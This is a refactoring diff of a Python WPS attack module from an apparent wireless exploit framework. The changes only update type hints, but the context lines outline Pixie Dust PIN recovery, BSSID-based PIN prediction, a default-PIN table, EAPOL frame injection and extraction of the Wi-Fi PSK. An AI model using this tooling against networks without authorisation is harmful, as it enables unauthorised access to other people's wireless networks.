@@ -39,7 +39,6 @@ OS requirement: Linux only (raw sockets, nl80211, monitor mode).
 Version: 1.0.0
 """
 
-from __future__ import annotations
 
 import hashlib
 import hmac as _hmac
@@ -51,7 +50,8 @@ import threading
 import time
 from dataclasses import dataclass
 from enum import Enum, auto
-from typing import Dict, Iterator, List, Optional, Tuple
+from typing import Dict, List, Optional, Tuple
+from collections.abc import Iterator
 
 from wirelessxpl.core.exploit import *
 from wirelessxpl.core.os_guard import OSRequirement, requires_os
@@ -195,7 +195,7 @@ class WpsLockState(Enum):
 # DH Key Exchange (RFC 3526 Group 5, 1536-bit MODP)
 # ---------------------------------------------------------------------------
 
-def _dh_generate_keypair() -> Tuple[int, int]:
+def _dh_generate_keypair() -> tuple[int, int]:
     """Generate a fresh DH keypair using RFC 3526 Group 5 (1536-bit).
 
     A fresh random private key is generated using a cryptographically
@@ -363,7 +363,7 @@ def _compute_authenticator(auth_key: bytes, prev_msg: bytes, curr_msg: bytes) ->
 # WPS TLV Frame Parsing and Building
 # ---------------------------------------------------------------------------
 
-def _tlv_parse(data: bytes) -> Dict[int, bytes]:
+def _tlv_parse(data: bytes) -> dict[int, bytes]:
     """Parse WPS TLV (Type-Length-Value) attributes from raw bytes.
 
     Attributes that appear multiple times will be overwritten by the
@@ -376,7 +376,7 @@ def _tlv_parse(data: bytes) -> Dict[int, bytes]:
     Returns:
         Dict mapping attribute type (int) to value (bytes).
     """
-    attrs: Dict[int, bytes] = {}
+    attrs: dict[int, bytes] = {}
     i = 0
     while i + 4 <= len(data):
         attr_type = struct.unpack(">H", data[i:i+2])[0]
@@ -405,7 +405,7 @@ def _build_m1(
     enrollee_nonce: bytes,
     pke: bytes,
     mac_bytes: bytes,
-    uuid_e: Optional[bytes] = None,
+    uuid_e: bytes | None = None,
 ) -> bytes:
     """Build the WPS M1 message TLV payload.
 
@@ -571,7 +571,7 @@ def _dot11_eapol_frame(
     src_mac: str,
     eap_payload: bytes,
     seq: int = 0,
-) -> "RadioTap":
+) -> RadioTap:
     """Build a complete Scapy 802.11 data frame carrying EAPOL/EAP.
 
     Constructs a monitor-mode injectable frame suitable for sending via
@@ -638,8 +638,8 @@ class WscCapture:
     priv_key: int = 0
     m2_raw: bytes = b""
     m3_raw: bytes = b""
-    network_key: Optional[bytes] = None
-    ssid: Optional[bytes] = None
+    network_key: bytes | None = None
+    ssid: bytes | None = None
 
 
 class WscSession:
@@ -688,7 +688,7 @@ class WscSession:
         self._src_mac_bytes = bytes(int(b, 16) for b in self._src_mac.split(":"))
 
         # Cached received frames (for state machine)
-        self._pending_msg: Optional[bytes] = None
+        self._pending_msg: bytes | None = None
 
     # ------------------------------------------------------------------
     # Internal Scapy helpers
@@ -711,7 +711,7 @@ class WscSession:
         self._seq = (self._seq + 1) & 0xFFF
         sendp(frame, iface=self.iface, verbose=0)
 
-    def _sniff_eapol(self, timeout: Optional[float] = None) -> Optional[bytes]:
+    def _sniff_eapol(self, timeout: float | None = None) -> bytes | None:
         """Sniff one EAPOL frame from the AP matching our bssid.
 
         Waits for a data frame from the AP (addr2 == bssid) containing
@@ -853,7 +853,7 @@ class WscSession:
             logger.warning("Failed to send Auth+Assoc+EAPOL-Start: %s", exc)
             return False
 
-    def _parse_wsc_msg(self, eap_frame: bytes) -> Optional[Tuple[int, int, bytes]]:
+    def _parse_wsc_msg(self, eap_frame: bytes) -> tuple[int, int, bytes] | None:
         """Parse an EAP-WSC frame and extract op_code and TLV payload.
 
         Args:
@@ -882,7 +882,7 @@ class WscSession:
     # M1-M3 exchange for Pixie Dust capture
     # ------------------------------------------------------------------
 
-    def capture_m2_for_pixie_dust(self, pin: str) -> Optional[WscCapture]:
+    def capture_m2_for_pixie_dust(self, pin: str) -> WscCapture | None:
         """Run M1 -> M2 -> M3 exchange to capture Pixie Dust material.
 
         Sends M1 and captures M2 from the AP. Extracts R-Hash1, R-Hash2,
@@ -1041,7 +1041,7 @@ class WscSession:
 def pixie_dust_recover_pin(
     capture: WscCapture,
     verbose: bool = False,
-) -> Optional[str]:
+) -> str | None:
     """Attempt offline WPS PIN recovery via Pixie Dust (CVE-2014-9527).
 
     Pixie Dust exploits weak pseudo-random number generators in WPS
@@ -1197,7 +1197,7 @@ def generate_pins_oui(bssid: str) -> Iterator[str]:
     oui = bssid.replace(":", "").upper()[:6]
 
     # OUI-to-default-PIN mapping from public vulnerability research
-    oui_pins: Dict[str, List[str]] = {
+    oui_pins: dict[str, list[str]] = {
         # TP-Link
         "C0C9E3": ["12345670", "00000000"],
         "50C7BF": ["12345670"],
@@ -1279,7 +1279,7 @@ def _wps_pin_checksum(pin7: int) -> str:
     return f"{pin7:07d}{(10 - acc % 10) % 10}"
 
 
-def predict_wps_pin_from_bssid(bssid: str) -> List[str]:
+def predict_wps_pin_from_bssid(bssid: str) -> list[str]:
     """Generate predicted WPS PINs from the AP BSSID using vendor algorithms.
 
     Research sources:
@@ -1310,7 +1310,7 @@ def predict_wps_pin_from_bssid(bssid: str) -> List[str]:
     except ValueError:
         return []
 
-    pins: List[str] = []
+    pins: list[str] = []
 
     # Algorithm 1: Ralink/MediaTek/TP-Link/Mercusys — CVE-2026-36612 variant
     #   PIN7 = (mac[3] << 16 | mac[4] << 8 | mac[5]) % 10000000
@@ -1361,7 +1361,7 @@ def predict_wps_pin_from_bssid(bssid: str) -> List[str]:
 
     # Deduplicate keeping order; filter valid 8-digit numeric
     seen: set = set()
-    result: List[str] = []
+    result: list[str] = []
     for p in pins:
         if p not in seen and len(p) == 8 and p.isdigit():
             seen.add(p)
@@ -1484,7 +1484,7 @@ class WpsLockTracker:
 # WPS AP Scan via wash (accepted dependency)
 # ---------------------------------------------------------------------------
 
-def scan_wps_aps(interface: str, timeout: int = 30) -> List[Dict]:
+def scan_wps_aps(interface: str, timeout: int = 30) -> list[dict]:
     """Scan for WPS-enabled APs using wash.
 
     wash is bundled with the reaver-suite and performs passive scanning
@@ -1518,7 +1518,7 @@ def scan_wps_aps(interface: str, timeout: int = 30) -> List[Dict]:
     except subprocess.TimeoutExpired as exc:
         raise RuntimeError("wash scan timed out") from exc
 
-    aps: List[Dict] = []
+    aps: list[dict] = []
     for line in result.stdout.splitlines():
         line = line.strip()
         if not line or line.startswith("BSSID") or line.startswith("-"):
@@ -1565,7 +1565,7 @@ def _iface_get_mac(interface: str) -> str:
         ) from exc
 
 
-def _extract_psk_from_creds(cred_tlv: bytes) -> Optional[str]:
+def _extract_psk_from_creds(cred_tlv: bytes) -> str | None:
     """Extract network PSK from a WPS Credential TLV (from M8).
 
     Args:
@@ -2065,7 +2065,7 @@ class Exploit(Exploit):
         return WscSession._STATE_M4_RECV
 
     @staticmethod
-    def _extract_psk_from_capture(capture: WscCapture) -> Optional[str]:
+    def _extract_psk_from_capture(capture: WscCapture) -> str | None:
         """Attempt to extract PSK from a completed WscCapture (M8 path).
 
         Args:
